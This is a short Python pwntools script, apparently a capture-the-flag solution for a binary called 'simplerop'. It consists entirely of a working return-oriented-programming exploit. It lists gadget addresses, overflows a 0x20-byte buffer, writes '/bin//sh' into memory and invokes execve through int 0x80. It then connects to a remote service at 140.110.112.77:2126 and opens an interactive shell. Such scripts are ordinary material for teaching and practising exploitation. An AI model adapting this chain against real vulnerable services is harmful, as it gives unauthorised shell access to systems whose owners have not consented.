from pwn import *

# 0x080bae06 : pop eax ; ret
pop_eax = 0x80bae06
# 0x0807b301 : mov dword ptr [eax], edx ; ret
mov_ptreax_edx = 0x807b301
# 0x08055552 : mov dword ptr [eax + 4], edx ; ret
mov_ptreax4_edx = 0x8055552
# 0x0806e82a : pop edx ; ret
pop_edx = 0x806e82a
# 0x0806e851 : pop ecx ; pop ebx ; ret
pop_ecx_pop_ebx = 0x806e851
# 0x080493e1 : int 0x80
int80 = 0x80493e1
# 0x080481b2 : ret
ret = 0x80481b2

r = process('simplerop')
r = remote('140.110.112.77', 2126)
raw_input('debug: ')
r.recvuntil('input :')
payload = 'a' * 0x20
payload += flat(pop_eax, 0x80ec000, pop_edx, '/bin', mov_ptreax_edx)
payload += flat(pop_edx, '//sh', mov_ptreax4_edx)
payload += flat(pop_eax, 0xb)
payload += flat(pop_ecx_pop_ebx, 0, 0x80ec000)
payload += flat(pop_edx, 0)
payload += flat(int80, 0x80ec000, 0, 0)
r.sendline(payload)
r.interactive()
